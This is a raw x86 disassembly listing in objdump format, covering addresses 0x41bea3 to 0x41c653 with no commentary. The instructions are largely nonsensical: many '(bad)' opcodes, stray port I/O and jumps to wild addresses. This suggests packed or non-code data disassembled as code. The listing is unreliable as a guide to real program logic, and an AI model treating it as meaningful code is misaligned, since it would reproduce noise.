  41bea3:	test   DWORD PTR [edi+0x38cf504f],esp
  41bea9:	add    BYTE PTR [eax],al
  41beab:	add    BYTE PTR [eax],al
  41bead:	add    BYTE PTR [eax+0x7c81ff57],bl
  41beb3:	sub    edi,ecx
  41beb5:	cld    
  41beb6:	(bad)  
  41beb7:	popf   
  41beb8:	and    al,0x40
  41beba:	in     al,dx
  41bebb:	xchg   ebp,eax
  41bebc:	and    al,0xfd
  41bebe:	mov    al,ds:0x9fd47aff
  41bec3:	fcmovne st,st(7)
  41bec5:	jb     0x41bf30
  41bec7:	push   esp
  41bec8:	mov    ebx,0x36b388fc
  41becd:	std    
  41bece:	sub    BYTE PTR [ebx+0x28172cf],0x26
  41bed5:	push   edi
  41bed6:	jge    0x41beb2
  41bed8:	loope  0x41beb7
  41beda:	loope  0x41bea4
  41bedc:	imul   eax,esp,0x69
  41bedf:	jg     0x41beb2
  41bee1:	not    edx
  41bee3:	enter  0xcb1,0x2e
  41bee7:	(bad)  
  41bee8:	jns    0x41bea1
  41beea:	(bad)  [edx+0x7cb9d0fb]
  41bef0:	fwait
  41bef1:	iret   
  41bef2:	mov    ecx,0x7502fb3e
  41bef7:	add    ah,bh
  41bef9:	test   BYTE PTR [ebx+0x5c235302],ch
  41beff:	sub    BYTE PTR [ebx],bh
  41bf01:	add    esp,esi
  41bf03:	mov    ebx,0xf889d0bc
  41bf08:	je     0x41bf06
  41bf0a:	xor    eax,0x69d8240b
  41bf0f:	jle    0x41bf8b
  41bf11:	(bad)  
  41bf12:	add    BYTE PTR [eax],al
  41bf14:	add    BYTE PTR [eax],al
  41bf16:	add    BYTE PTR [ecx-0x38],dh
  41bf19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf1a:	inc    esi
  41bf1b:	cmp    DWORD PTR [ebx+0x2b],0xfb35abd0
  41bf22:	push   ecx
  41bf23:	cmp    BYTE PTR [edi+ebx*4],cl
  41bf26:	add    cl,bh
  41bf28:	pop    ss
  41bf29:	xchg   ecx,eax
  41bf2a:	ror    BYTE PTR [ecx-0x7c],1
  41bf2d:	sti    
  41bf2e:	fild   WORD PTR [edx+0x7b]
  41bf31:	and    edi,eax
  41bf33:	imul   edi,DWORD PTR [ebp+0x79],0x6fc832f2
  41bf3a:	sub    DWORD PTR cs:[edi+ebp*1],ecx
  41bf3e:	dec    esi
  41bf3f:	or     esi,DWORD PTR [di-0x5ba1]
  41bf44:	repz fstp QWORD PTR [ecx-0x284bf683]
  41bf4b:	xchg   BYTE PTR ds:0xeeb7d0aa,bl
  41bf51:	(bad)  
  41bf52:	out    dx,eax
  41bf53:	mov    bl,0xee
  41bf55:	jnp    0x41bf9a
  41bf57:	shr    ecx,1
  41bf59:	mov    BYTE PTR [edi-0x6a407cc6],ch
  41bf5f:	jmp    0x3d231a6e
  41bf64:	clc    
  41bf65:	xor    BYTE PTR [eax],ah
  41bf67:	aaa    
  41bf68:	jg     0x41bfb7
  41bf6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf6b:	jns    0x41bef4
  41bf6d:	or     al,0x6e
  41bf6f:	in     al,dx
  41bf70:	int    0xfc
  41bf72:	div    dh
  41bf74:	dec    esp
  41bf75:	lock jmp 0xd11e42f0
  41bf7b:	add    BYTE PTR [eax],al
  41bf7d:	add    BYTE PTR [eax],al
  41bf7f:	add    BYTE PTR [edx-0x3ac3c73a],bh
  41bf85:	test   BYTE PTR [ecx-0x33943d7],0x62
  41bf8c:	cmp    al,0x1e
  41bf8e:	inc    eax
  41bf8f:	jo     0x41bfcd
  41bf91:	push   ds
  41bf92:	std    
  41bf93:	xor    al,0x4d
  41bf95:	jns    0x41bf6b
  41bf97:	inc    ebx
  41bf98:	jno    0x41bf5f
  41bf9a:	jb     0x41bf69
  41bf9c:	out    dx,eax
  41bf9d:	mov    edx,0x2d591cfc
  41bfa2:	std    
  41bfa3:	adc    al,0x69
  41bfa5:	(bad)  
  41bfa6:	jb     0x41bf8d
  41bfa8:	sub    edx,DWORD PTR [eax+ecx*1-0x7f]
  41bfac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfad:	(bad)  
  41bfaf:	xchg   ah,bh
  41bfb1:	xchg   BYTE PTR [esp+eiz*2],cl
  41bfb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfb5:	icebp  
  41bfb6:	(bad)  
  41bfb7:	call   0x6d9cc93b
  41bfbc:	(bad)  
  41bfbd:	scas   al,BYTE PTR es:[edi]
  41bfbe:	out    0xf1,al
  41bfc0:	dec    ebp
  41bfc1:	(bad)  
  41bfc2:	cld    
  41bfc3:	out    dx,al
  41bfc4:	or     BYTE PTR [esi],dh
  41bfc6:	jmp    ebp
  41bfc8:	add    BYTE PTR [esi],bh
  41bfca:	add    ch,BYTE PTR [eax]
  41bfcc:	sbb    bh,bh
  41bfce:	or     BYTE PTR [eax],al
  41bfd0:	inc    esp
  41bfd1:	dec    ebx
  41bfd2:	mov    esi,0xfda6d9c7
  41bfd7:	dec    DWORD PTR [ebx+eax*1]
  41bfda:	test   DWORD PTR [ebp-0x60],eax
  41bfdd:	add    ebx,0x3
  41bfe0:	test   DWORD PTR [eax-0x3],ecx
  41bfe3:	inc    DWORD PTR [eax]
  41bfe5:	add    BYTE PTR [eax],al
  41bfe7:	add    BYTE PTR [eax],al
  41bfe9:	int3   
  41bfea:	(bad)  
  41bfeb:	mov    dl,0x4f
  41bfed:	int    0xc7
  41bfef:	mov    dl,0x57
  41bff1:	fidivr WORD PTR [ebp-0x7738f723]
  41bff7:	test   DWORD PTR [ebp+0x74],ecx
  41bffa:	repz les esi,FWORD PTR [ebx]
  41bffd:	mov    WORD PTR [esi+0x3b],?
  41c000:	inc    eax
  41c001:	adc    eax,0x280ffc39
  41c006:	mov    esi,0x458fc77f
  41c00b:	dec    edx
  41c00c:	in     al,dx
  41c00d:	pop    ss
  41c00e:	inc    edx
  41c00f:	clc    
  41c010:	jmp    0x41c047
  41c012:	mov    edi,0x29df041
  41c017:	add    BYTE PTR [eax],al
  41c019:	jg     0x41bfdd
  41c01b:	test   DWORD PTR [ebp-0x40],eax
  41c01e:	aas    
  41c01f:	out    0x52,eax
  41c021:	outs   dx,DWORD PTR ds:[esi]
  41c022:	ret    0x893c
  41c025:	cdq    
  41c026:	scas   al,BYTE PTR es:[edi]
  41c027:	out    0xf2,eax
  41c029:	aas    
  41c02a:	xchg   DWORD PTR ds:0x4a470c33,edi
  41c030:	lock aad 0x3a
  41c033:	cld    
  41c034:	inc    edi
  41c035:	out    0x3e,eax
  41c037:	or     esi,DWORD PTR [esi-0x49f5006d]
  41c03d:	pop    ebx
  41c03e:	add    BYTE PTR [ebp-0x400eeb1f],bh
  41c044:	(bad)  
  41c045:	fnstenv [ecx+0x20cfffd]
  41c04b:	pop    es
  41c04c:	retf   0x0
  41c04f:	add    BYTE PTR [eax],al
  41c051:	add    BYTE PTR [ebp+0x40],dh
  41c054:	jno    0x41bfe0
  41c056:	mov    ebp,0xf6be7a1c
  41c05b:	cmp    eax,DWORD PTR [edi+eax*4]
  41c05e:	mov    eax,0xf4bdfe37
  41c063:	inc    ebx
  41c064:	pop    edx
  41c065:	inc    eax
  41c066:	jne    0x41c00c
  41c068:	mov    al,BYTE PTR [esi+0x4070e5]
  41c06e:	cmp    dl,BYTE PTR [edx+0x48]
  41c071:	cld    
  41c072:	in     al,dx
  41c073:	sahf   
  41c074:	enter  0xbc82,0x6e
  41c078:	clc    
  41c079:	mov    dh,0xca
  41c07b:	cld    
  41c07c:	int    0x7c
  41c07e:	in     al,dx
  41c07f:	xchg   esi,eax
  41c080:	enter  0x30c,0xa5
  41c084:	inc    ebp
  41c085:	xchg   DWORD PTR [eax-0x31],ecx
  41c088:	test   BYTE PTR [edi+0x1634d7a],bh
  41c08e:	jne    0x41c06b
  41c090:	jg     0x41c053
  41c092:	lahf   
  41c093:	pop    eax
  41c094:	retf   0x820c
  41c097:	pop    esp
  41c098:	int3   
  41c099:	pcmpeqw mm3,mm3
  41c09c:	retf   
  41c09d:	and    ebp,eax
  41c09f:	xor    BYTE PTR [ebx-0x51378ac2],dl
  41c0a5:	inc    ecx
  41c0a6:	scas   al,BYTE PTR es:[edi]
  41c0a7:	cdq    
  41c0a8:	cli    
  41c0a9:	mov    edi,DWORD PTR [eax+ebx*8+0xdec0000]
  41c0b0:	clc    
  41c0b1:	call   0x41f0692c
  41c0b6:	add    BYTE PTR [eax],al
  41c0b8:	add    BYTE PTR [eax],al
  41c0ba:	add    dh,bh
  41c0bc:	in     al,0x5f
  41c0be:	cmp    DWORD PTR [esp+ecx*8],ebp
  41c0c1:	jg     0x41c10e
  41c0c3:	jb     0x41c0a0
  41c0c5:	add    BYTE PTR [ecx+0x7400b3bb],al
  41c0cb:	xchg   ecx,eax
  41c0cc:	add    DWORD PTR [edi*8+0x7eff02a3],eax
  41c0d3:	enter  0x71e6,0xc1
  41c0d7:	adc    al,BYTE PTR [ebx-0x59]
  41c0da:	add    dh,BYTE PTR [ebp+0x7f]
  41c0dd:	es std 
  41c0df:	test   edx,0x7901cd39
  41c0e5:	mov    ds:0x621f0dcf,eax
  41c0ea:	ss xchg ecx,eax
  41c0ec:	sbb    DWORD PTR [ecx],esp
  41c0ee:	or     edx,eax
  41c0f0:	dec    esp
  41c0f1:	add    edi,DWORD PTR [edx+0x6d]
  41c0f4:	or     BYTE PTR [ebp+0x69ef661f],ch
  41c0fa:	retf   0xf3d3
  41c0fd:	bound  ebp,QWORD PTR [ecx+0x7a05c4c5]
  41c103:	sub    eax,0x8e3dc103
  41c108:	cmc    
  41c109:	push   0xffffffbd
  41c10b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c10c:	(bad)  
  41c10d:	in     eax,dx
  41c10e:	js     0x41c14f
  41c110:	retf   0xcd29
  41c113:	aaa    
  41c114:	out    dx,al
  41c115:	pop    ds
  41c116:	inc    edi
  41c117:	add    DWORD PTR [esi+esi*2-0x26],0x3e6ffb0
  41c11f:	add    BYTE PTR [eax],al
  41c121:	add    BYTE PTR [eax],al
  41c123:	add    ah,bh
  41c125:	sub    edx,DWORD PTR [ebx+0x19]
  41c128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c129:	or     BYTE PTR [ecx-0x45400e04],ah
  41c12f:	int3   
  41c130:	jno    0x41c132
  41c132:	(bad)  
  41c133:	fidivr DWORD PTR [ecx+eax*1]
  41c136:	out    0x3,eax
  41c138:	cmp    BYTE PTR [esi],bh
  41c13a:	repz add dh,BYTE PTR [ebp+0x2]
  41c13e:	out    0x80,eax
  41c140:	dec    edx
  41c141:	add    bl,dh
  41c143:	jg     0x41c151
  41c145:	add    edi,esp
  41c147:	add    edi,DWORD PTR [esp+0xb]
  41c14b:	std    
  41c14c:	cmc    
  41c14d:	mov    al,ds:0xc7417cff
  41c152:	or     al,0x37
  41c154:	and    eax,0x1c638143
  41c159:	push   eax
  41c15a:	es out dx,al
  41c15c:	cwde   
  41c15d:	xor    eax,0xf9834156
  41c163:	fnstsw WORD PTR [eax+0x34380f3]
  41c169:	push   eax
  41c16a:	and    DWORD PTR [eax+0x2c],ebp
  41c16d:	cmp    edi,0x82f576e8
  41c173:	mov    ebp,0x6afcc6c5
  41c178:	xor    BYTE PTR [edx+0x0],ah
  41c17b:	out    dx,al
  41c17c:	repz popa 
  41c17e:	icebp  
  41c17f:	push   ss
  41c180:	rol    esi,0x42
  41c183:	cmc    
  41c184:	jg     0x41c1c5
  41c186:	adc    al,0x87
  41c188:	add    BYTE PTR [eax],al
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	add    BYTE PTR [esi+0x76eb72dc],dh
  41c192:	add    bh,BYTE PTR [ecx]
  41c194:	xchg   edi,eax
  41c195:	push   edx
  41c196:	push   ecx
  41c197:	out    dx,al
  41c198:	imul   edi,DWORD PTR [ebp-0x8],0xd93ad072
  41c19f:	in     eax,0xa6
  41c1a1:	xor    al,0xee
  41c1a3:	(bad)  
  41c1a4:	call   0xd1c2c41f
  41c1a9:	jo     0x41c1a0
  41c1ab:	mov    esp,DWORD PTR [ecx]
  41c1ad:	jnp    0x41c1b1
  41c1af:	add    BYTE PTR [edx],al
  41c1b1:	dec    edi
  41c1b2:	push   esi
  41c1b3:	or     eax,0xfcceb96a
  41c1b8:	scas   al,BYTE PTR es:[edi]
  41c1b9:	outs   dx,BYTE PTR ds:[esi]
  41c1ba:	lea    edx,[eax]
  41c1bc:	sub    bh,dl
  41c1be:	enter  0xee06,0xda
  41c1c2:	and    ecx,esi
  41c1c4:	xchg   esi,eax
  41c1c5:	ds cmp cl,0xc9
  41c1c9:	dec    edi
  41c1ca:	jg     0x41c1e2
  41c1cc:	add    BYTE PTR [edi-0x97e0449],bh
  41c1d2:	popf   
  41c1d3:	cld    
  41c1d4:	call   FWORD PTR [eax+ecx*8]
  41c1d7:	or     BYTE PTR ds:0xfffbb7af,0xd1
  41c1de:	shl    BYTE PTR ds:0xc9392045,cl
  41c1e4:	jmp    0x41be65
  41c1e9:	push   ebx
  41c1ea:	inc    ecx
  41c1eb:	adc    al,0x1
  41c1ed:	or     al,0xff
  41c1ef:	inc    DWORD PTR [edx+0x0]
  41c1f5:	add    BYTE PTR [ebp+edi*8-0x33373f6],dh
  41c1fc:	(bad)  
  41c1fd:	jmp    edi
  41c1ff:	sbb    BYTE PTR [edi+ecx*1+0x4f],ch
  41c203:	mov    dh,0xef
  41c205:	(bad)  
  41c206:	jnp    0x41c1cf
  41c208:	mov    dl,0x13
  41c20a:	pop    ds
  41c20b:	jl     0x41c203
  41c20d:	or     eax,esp
  41c20f:	int    0x7f
  41c211:	cli    
  41c212:	lods   al,BYTE PTR ds:[esi]
  41c213:	xor    cl,BYTE PTR [ecx+eax*4]
  41c216:	jbe    0x41c1b6
  41c218:	cld    
  41c219:	call   FWORD PTR [edi+eax*8-0x4851327f]
  41c220:	sti    
  41c221:	call   DWORD PTR [ecx-0x2e]
  41c224:	xor    eax,0xd138a045
  41c229:	jmp    0x41bfea
  41c22e:	rol    DWORD PTR [ecx+0x14],cl
  41c231:	add    DWORD PTR [esi+edi*8-0x24b7d01],ecx
  41c238:	or     cl,BYTE PTR [esp+ecx*1+0x67000007]
  41c23f:	in     al,dx
  41c240:	imul   ecx,DWORD PTR [edi],0xffffffcf
  41c243:	(bad)  
  41c244:	out    dx,eax
  41c245:	(bad)  
  41c246:	sti    
  41c247:	mov    esp,0xec7513b2
  41c24c:	test   cl,bh
  41c24e:	jg     0x41c25f
  41c250:	out    dx,eax
  41c251:	cmp    BYTE PTR [edi],0xb7
  41c254:	stc    
  41c255:	(bad)  
  41c256:	loopne 0x41c295
  41c258:	retf   0xfc
  41c25b:	add    BYTE PTR [eax],al
  41c25d:	add    BYTE PTR [eax],al
  41c25f:	hlt    
  41c260:	xor    eax,0xac2aff80
  41c265:	stc    
  41c266:	sub    esp,0x5d
  41c269:	retf   0x1afc
  41c26c:	addr16 in al,dx
  41c26e:	ss mov eax,0x1ccf46bf
  41c274:	xor    BYTE PTR [eax+eax*1],al
  41c277:	jne    0x41c269
  41c279:	aas    
  41c27a:	adc    al,0x74
  41c27c:	stos   DWORD PTR es:[edi],eax
  41c27d:	add    BYTE PTR [eax],al
  41c27f:	div    bl
  41c281:	add    ecx,DWORD PTR ds:0x45ff9
  41c287:	jne    0x41c22d
  41c289:	es ins BYTE PTR es:[edi],dx
  41c28b:	push   0x2c
  41c28d:	dec    ebp
  41c28e:	icebp  
  41c28f:	rcr    BYTE PTR [eax],cl
  41c291:	cli    
  41c292:	mov    ch,0x66
  41c294:	ins    BYTE PTR es:[edi],dx
  41c295:	test   ecx,edi
  41c297:	outs   dx,DWORD PTR ds:[esi]
  41c298:	mov    eax,0xc0c75574
  41c29d:	mov    BYTE PTR [eax+0xc46a6af],0xf4
  41c2a4:	mov    ch,0x7c
  41c2a6:	jmp    DWORD PTR [edx+0x3082f7ab]
  41c2ac:	ffree  st(6)
  41c2ae:	cld    
  41c2af:	xchg   edx,eax
  41c2b0:	out    dx,al
  41c2b1:	out    dx,eax
  41c2b2:	xor    BYTE PTR ss:[edi-0x1c7330ba],dh
  41c2b9:	add    BYTE PTR [eax],al
  41c2bb:	jne    0x41c279
  41c2bd:	mov    dl,0x41
  41c2bf:	cld    
  41c2c0:	sbb    eax,0x38f0
  41c2c5:	add    BYTE PTR [eax],al
  41c2c7:	add    BYTE PTR [edi],dh
  41c2c9:	loopne 0x41c33f
  41c2cb:	dec    ecx
  41c2cc:	je     0x41c2d0
  41c2ce:	out    0x3,eax
  41c2d0:	dec    esp
  41c2d1:	add    eax,0xfdb4b5da
  41c2d6:	xor    al,0x58
  41c2d8:	js     0x41c25f
  41c2da:	cmp    bh,dh
  41c2dc:	inc    edx
  41c2dd:	shl    ebp,0x91
  41c2e0:	ins    DWORD PTR es:[edi],dx
  41c2e1:	lea    edx,[eax+edx*1]
  41c2e4:	dec    DWORD PTR ds:0xa2f544d8
  41c2ea:	loop   0x41c2e4
  41c2ec:	test   DWORD PTR [edx],0xc119c959
  41c2f2:	mov    ds:0xfb474bef,eax
  41c2f7:	dec    ecx
  41c2f8:	and    ch,BYTE PTR [ebx+0x27502ef]
  41c2fe:	cli    
  41c2ff:	mov    ch,0xb4
  41c301:	mov    edx,DWORD PTR [ebx-0x1a3b5211]
  41c307:	ja     0x41c381
  41c309:	add    esp,edi
  41c30b:	add    ecx,esp
  41c30d:	add    al,0xda
  41c30f:	mov    ch,0x34
  41c311:	std    
  41c312:	mov    esp,0xfc858057
  41c317:	test   dl,0xc0
  41c31a:	fst    QWORD PTR [ecx+0xf9c8d6d]
  41c320:	out    dx,eax
  41c321:	or     eax,0xa2f544d8
  41c326:	jmp    0xc8:0xf7cef6f8
  41c32d:	add    BYTE PTR [eax],al
  41c32f:	add    BYTE PTR [eax],al
  41c331:	mov    eax,ds:0x63f02bc0
  41c336:	inc    edi
  41c337:	repz dec ecx
  41c339:	stos   BYTE PTR es:[edi],al
  41c33a:	stos   BYTE PTR es:[edi],al
  41c33b:	mov    bl,0x3
  41c33d:	jne    0x41c341
  41c33f:	sbb    dh,BYTE PTR [esi-0xfe474cc]
  41c345:	cmp    eax,0x4477edc4
  41c34a:	add    eax,DWORD PTR [eax]
  41c34c:	jmp    0xfa426cc7
  41c351:	sub    BYTE PTR [edx+0x39],al
  41c354:	inc    edi
  41c355:	mov    ebp,0x4ac3810d
  41c35a:	sar    ah,0xe6
  41c35d:	in     al,0xa
  41c35f:	mov    DWORD PTR [edi],esi
  41c361:	mov    WORD PTR gs:[ebx],cs
  41c364:	fdiv   DWORD PTR [ecx+0x2de8de82]
  41c36a:	test   DWORD PTR [esi-0x340c288],ecx
  41c370:	and    al,0x25
  41c372:	stc    
  41c373:	inc    edx
  41c374:	std    
  41c375:	lods   al,BYTE PTR ds:[esi]
  41c376:	xlat   BYTE PTR ds:[ebx]
  41c377:	out    0x88,al
  41c379:	jbe    0x41c37d
  41c37b:	add    BYTE PTR [edx],bl
  41c37d:	ret    
  41c37e:	inc    ecx
  41c37f:	xchg   DWORD PTR [edx+edx*1-0x7d093e05],esi
  41c386:	xchg   ebp,eax
  41c387:	(bad)  
  41c388:	call   0xfa426d03
  41c38d:	and    BYTE PTR [edx+0x39],al
  41c390:	(bad)
  41c394:	xchg   DWORD PTR [eax],eax
  41c396:	add    BYTE PTR [eax],al
  41c398:	add    BYTE PTR [eax],al
  41c39a:	loop   0x41c35b
  41c39c:	cld    
  41c39d:	out    dx,al
  41c39e:	in     al,0xa
  41c3a0:	mov    DWORD PTR [edi-0x7f47386],edi
  41c3a6:	cmp    DWORD PTR [edx-0x7c421722],eax
  41c3ac:	push   edx
  41c3ad:	clc    
  41c3ae:	mov    edx,0x9aacfcbe
  41c3b3:	clc    
  41c3b4:	inc    edx
  41c3b5:	aad    0x2c
  41c3b7:	xlat   BYTE PTR ds:[ebx]
  41c3b8:	call   0x42164a0e
  41c3bd:	jo     0x41c403
  41c3bf:	push   ss
  41c3c0:	cmp    DWORD PTR [ebx-0x1516a0c3],ebp
  41c3c6:	addr16 aam 0x41
  41c3c9:	add    BYTE PTR [edi-0x18],dh
  41c3cc:	imul   ecx,DWORD PTR [edi],0xffffffdf
  41c3cf:	pop    ebp
  41c3d0:	or     al,0x0
  41c3d2:	pop    esp
  41c3d3:	mov    eax,0xf0d70bb2
  41c3d8:	xor    ecx,DWORD PTR [edx-0x7fc049a0]
  41c3de:	std    
  41c3df:	mov    ch,0xb
  41c3e1:	test   DWORD PTR [esi+edx*8],edi
  41c3e4:	sti    
  41c3e5:	push   ebx
  41c3e7:	inc    eax
  41c3e8:	adc    al,0x39
  41c3ea:	mov    DWORD PTR [edx+0x1307d97a],esi
  41c3f0:	das    
  41c3f1:	rcr    BYTE PTR [esi+0x3d],cl
  41c3f4:	push   edx
  41c3f5:	adc    al,0xe7
  41c3f7:	sar    BYTE PTR [eax+0x2c],0xc7
  41c3fb:	add    ebp,DWORD PTR [edi]
  41c3fd:	rol    BYTE PTR [eax],cl
  41c3ff:	add    BYTE PTR [eax],al
  41c401:	add    BYTE PTR [eax],al
  41c403:	fimul  WORD PTR [ebx]
  41c405:	pop    esi
  41c406:	ins    BYTE PTR es:[edi],dx
  41c407:	adc    eax,DWORD PTR [eax+esi*1+0xb030c0c]
  41c40e:	mov    dh,0x7
  41c410:	cmp    al,0x53
  41c412:	xor    al,0x66
  41c414:	mov    edx,0xa55c430d
  41c419:	or     al,0xf
  41c41b:	pop    eax
  41c41c:	fucomi st,st(4)
  41c41e:	call   DWORD PTR [ebx-0x2aebbe39]
  41c424:	inc    ecx
  41c425:	adc    al,0x7e
  41c427:	test   DWORD PTR [ebx],edi
  41c429:	dec    edx
  41c42a:	clc    
  41c42b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c42c:	lds    ecx,FWORD PTR [ebx]
  41c42e:	test   dl,ah
  41c430:	mov    eax,ds:0x491ffffb
  41c435:	in     al,dx
  41c436:	add    BYTE PTR [ebx-0x73f2717f],dl
  41c43c:	add    al,BYTE PTR [edi-0x417c47ab]
  41c442:	cli    
  41c443:	add    eax,0x7583fbea
  41c448:	shl    ebp,cl
  41c44a:	or     al,0xfa
  41c44c:	push   ecx
  41c44d:	idiv   edi
  41c44f:	jp     0x41c418
  41c451:	sbb    al,0x93
  41c453:	push   ds
  41c454:	xor    eax,0xeefc0044
  41c459:	out    dx,eax
  41c45a:	cmp    BYTE PTR [edi+ebp*8],dh
  41c45d:	dec    ebx
  41c45e:	mov    DWORD PTR [ebx-0x3927f6e9],esi
  41c464:	hlt    
  41c465:	cmp    BYTE PTR [ebp+0x0],0x0
  41c469:	add    BYTE PTR [eax],al
  41c46b:	add    BYTE PTR [ebp-0x55],ch
  41c46e:	dec    esp
  41c46f:	sbb    cl,bh
  41c471:	stos   DWORD PTR es:[edi],eax
  41c472:	lds    esi,FWORD PTR [ebp+0x5d]
  41c475:	xor    BYTE PTR [ecx+0x79dfcb8a],bh
  41c47b:	rcr    BYTE PTR ds:0x22ff049c,0x27
  41c482:	shl    DWORD PTR [edx-0x3d],0x30
  41c486:	cmp    al,bh
  41c488:	push   ds
  41c489:	mov    edi,0x695579
  41c48e:	ret    0x1d38
  41c491:	aad    0xec
  41c493:	mov    DWORD PTR [esi+0x1],esi
  41c496:	ds sub al,0x68
  41c499:	scas   al,BYTE PTR es:[edi]
  41c49a:	cmp    ecx,0x8a047f74
  41c4a0:	ss stos BYTE PTR es:[edi],al
  41c4a2:	push   es
  41c4a3:	inc    esi
  41c4a4:	mov    BYTE PTR [edi+0x66d2410c],bl
  41c4aa:	in     al,dx
  41c4ab:	cmp    BYTE PTR ss:[edi-0x3d314ebc],bh
  41c4b2:	sbb    eax,ecx
  41c4b4:	out    dx,al
  41c4b5:	ins    DWORD PTR es:[edi],dx
  41c4b6:	push   esp
  41c4b7:	mov    ebp,eax
  41c4b9:	shl    BYTE PTR [ecx+0x5e3dbf38],1
  41c4bf:	mov    DWORD PTR [ebp-0xf83c4e0],edi
  41c4c5:	add    ah,BYTE PTR [edi+0x3bf96450]
  41c4cb:	cld    
  41c4cc:	add    BYTE PTR [edx+ebx*1],cl
  41c4cf:	mov    ebx,0x0
  41c4d4:	add    BYTE PTR [ebx-0x75],al
  41c4d7:	sbb    al,0x28
  41c4d9:	cmp    al,0xc3
  41c4db:	cmc    
  41c4dc:	je     0x41c4b9
  41c4de:	mov    bl,0xbd
  41c4e0:	(bad)
  41c4e3:	mov    bh,0x4
  41c4e5:	jo     0x41c46e
  41c4e7:	test   al,0xe0
  41c4e9:	pop    ecx
  41c4ea:	mov    ebp,0xd5126e1
  41c4ef:	imul   esp,DWORD PTR [ecx],0x7995bd45
  41c4f5:	mov    bh,0xe6
  41c4f7:	es jnp 0x41c4b1
  41c4fa:	out    0x85,al
  41c4fc:	dec    edi
  41c4fd:	pop    ecx
  41c4fe:	mov    DWORD PTR [ebp-0x4428aa6],edx
  41c504:	out    0xed,eax
  41c506:	enter  0x4f6d,0x7d
  41c50a:	push   esp
  41c50b:	dec    di
  41c50d:	gs mov ebp,0x3709f7d3
  41c513:	(bad)  
  41c515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c517:	dec    ebp
  41c518:	lds    ebp,FWORD PTR [ebp-0x80ad979]
  41c51e:	push   ebp
  41c51f:	in     eax,dx
  41c520:	add    esi,DWORD PTR [ebp-0x7]
  41c523:	xchg   ebx,eax
  41c524:	(bad)  
  41c525:	gs (bad) 
  41c527:	aas    
  41c528:	fxch   st(1)
  41c52a:	mov    esp,0xa8aa0125
  41c52f:	push   edi
  41c530:	jnp    0x41c569
  41c532:	push   ss
  41c533:	rol    dl,cl
  41c535:	aas    
  41c536:	push   0x3e61
  41c53b:	add    BYTE PTR [eax],al
  41c53d:	add    BYTE PTR [ecx-0x7],cl
  41c540:	push   ds
  41c541:	push   ecx
  41c542:	cli    
  41c543:	or     al,0x35
  41c545:	icebp  
  41c546:	cmc    
  41c547:	mov    bh,0xff
  41c549:	jecxz  0x41c57e
  41c54b:	push   cs
  41c54c:	inc    ecx
  41c54d:	mov    dl,0xce
  41c54f:	xor    DWORD PTR [esi+0x73087d69],edx
  41c555:	add    eax,0xd3811bac
  41c55a:	jl     0x41c58c
  41c55c:	sbb    al,0x6a
  41c55e:	xor    BYTE PTR [edx],ah
  41c560:	add    BYTE PTR [esi*8-0x450d067e],bh
  41c567:	or     eax,DWORD PTR [ecx+0xc306ab3]
  41c56d:	push   0xe8ff812c
  41c572:	jbe    0x41c581
  41c574:	or     DWORD PTR [edi],0x30
  41c577:	mov    edi,0x41382afc
  41c57c:	adc    al,0xd0
  41c57e:	adc    DWORD PTR [esi],0x7c
  41c581:	inc    edi
  41c582:	dec    edi
  41c583:	pop    esp
  41c584:	std    
  41c585:	jle    0x41c5b8
  41c587:	sti    
  41c588:	pop    ebp
  41c589:	add    eax,0x6e3a8328
  41c58e:	xor    DWORD PTR [edi-0x7cfa60f4],edi
  41c594:	stc    
  41c595:	lock add DWORD PTR [eax-0x40c6a9b8],eax
  41c59c:	adc    BYTE PTR [ebx+0x56],0xd
  41c5a0:	test   BYTE PTR [ebx+0x0],ch
  41c5a6:	add    BYTE PTR [ecx-0x43970342],bh
  41c5ac:	fwait
  41c5ad:	(bad)  
  41c5ae:	call   0xf7c5d329
  41c5b3:	mov    cl,0xbe
  41c5b5:	cld    
  41c5b6:	stos   BYTE PTR es:[edi],al
  41c5b7:	ss stc 
  41c5b9:	mov    esi,0x28a5069d
  41c5be:	push   ss
  41c5bf:	mov    ecx,0x22af38be
  41c5c4:	or     eax,0xc6a40081
  41c5c9:	sti    
  41c5ca:	call   FWORD PTR [ebx-0x597cf073]
  41c5d0:	mov    ecx,0xc90f1170
  41c5d5:	sbb    al,0x74
  41c5d7:	mov    BYTE PTR [esi-0x635f0a],al
  41c5dd:	dec    DWORD PTR [esi]
  41c5df:	adc    DWORD PTR ds:0x43abfffb,ecx
  41c5e5:	inc    eax
  41c5e6:	cmp    ebx,DWORD PTR ds:0x2ae9d842
  41c5ec:	sar    bl,0xff
  41c5ef:	and    DWORD PTR [si+0xf],ebp
  41c5f3:	iret   
  41c5f4:	(bad)  
  41c5f6:	call   FWORD PTR [ebx]
  41c5f8:	movzx  edx,BYTE PTR [ebx]
  41c5fb:	fistp  QWORD PTR [esi+eax*1+0xf]
  41c5ff:	shr    BYTE PTR [ebp-0x6],1
  41c602:	(bad)  
  41c603:	jmp    0x41c587
  41c605:	test   BYTE PTR [ebx],0x2b
  41c608:	sbb    esp,0xfffffffe
  41c60b:	add    BYTE PTR [eax],al
  41c60d:	add    BYTE PTR [eax],al
  41c60f:	add    BYTE PTR [ebx+0x18fa7fbf],ch
  41c615:	adc    BYTE PTR [edi+edx*8-0x7c044076],al
  41c61c:	xchg   esi,eax
  41c61d:	adc    DWORD PTR [ebx],ecx
  41c61f:	test   BYTE PTR [edx-0x40],bl
  41c622:	sti    
  41c623:	dec    DWORD PTR [ebp+0xc00817c]
  41c629:	dec    DWORD PTR [edx]
  41c62b:	test   BYTE PTR [esi+0x1ffffbc0],bl
  41c631:	aas    
  41c632:	aaa    
  41c633:	shr    DWORD PTR [eax],0x81
  41c636:	in     eax,0xb7
  41c638:	mov    bh,BYTE PTR [edi-0x1545c405]
  41c63e:	or     al,BYTE PTR [ebx-0x43fc0]
  41c644:	jne    0x41c5ea
  41c646:	jbe    0x41c658
  41c648:	test   BYTE PTR [esi],0xe
  41c64b:	je     0x41c5db
  41c64d:	sub    BYTE PTR [esi-0x7a2cdef8],bh
  41c653:	stc    
